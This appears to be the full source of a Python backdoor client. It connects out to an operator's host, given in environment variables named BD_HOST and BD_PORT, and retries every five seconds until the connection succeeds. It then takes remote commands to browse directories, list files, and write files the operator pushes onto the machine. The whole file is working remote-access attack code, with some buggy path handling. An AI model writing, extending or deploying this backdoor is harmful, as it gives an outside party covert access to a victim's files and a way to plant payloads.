import socket
import os
import time

REMOTE_HOST = str(os.environ.get("BD_HOST"))
REMOTE_PORT = int(os.environ.get("BD_PORT"))
print("Host: " + REMOTE_HOST + " type: " + str(type(REMOTE_HOST)))
print("Port: " + str(REMOTE_PORT) + " type: " + str(type(REMOTE_PORT)))
server = socket.socket()
print("[-] Connection Initiating...")
while True:
    try:
        server.connect((REMOTE_HOST, REMOTE_PORT))
        break
    except:
        print("Connection failed trying again in 5 seconds")
        time.sleep(5)

print("[-] Connection initiated!")
restart = False
wd = os.getcwd()
server.send(wd.encode("UTF-8"))

while True:
    old_path = wd
    if restart:
        server.send(wd.encode("UTF-8"))
    print("[-] Awaiting commands...")
    recvString = server.recv(1024)
    recvString = recvString.decode()
    inputList = recvString.split(" ")
    command = inputList[0]
    args = inputList.copy()
    del (args[0])
    if command == "quit":
        restart = True
    elif command == "cd":
        arg = args[0]
        if arg == "..":
            newPath = ""
            pathList = wd.split("/")
            del (pathList[-1])
            for s in pathList:
                newPath = newPath + s + "/"
            newPath = newPath[:-1]
            wd = newPath
            server.send(wd.encode("UTF-8"))
            continue
        if arg[0] == "/":
            print("test")
            if os.path.exists(arg):
                wd = arg
            else:
                print("invalid path")
                wd = "invalid"
        else:
            newPath = wd + "/" + arg
            print(newPath)
            if os.path.exists(newPath):
                wd = newPath
            else:
                print("invalid path")
                wd = "invalid"

        server.send(wd.encode("UTF-8"))
        if wd == "invalid":
            wd = old_path

    elif command == "ls":
        output = ""
        for s in sorted(os.listdir(wd)):
            output = output + "\n" + s
        server.send(output.encode("UTF-8"))

    elif command == "send":
        recvFileName = server.recv(1024)
        recvFileName = recvFileName.decode()
        recvFileData = server.recv(1000000)
        lul = wd + recvFileName
        if not os.path.exists(wd + "\\" + recvFileName):
            newFile = open(recvFileName, "wb")
            newFile.write(recvFileData)
            newFile.close()
            server.send("success".encode("UTF-8"))
        else:
            server.send("failed".encode("UTF-8"))

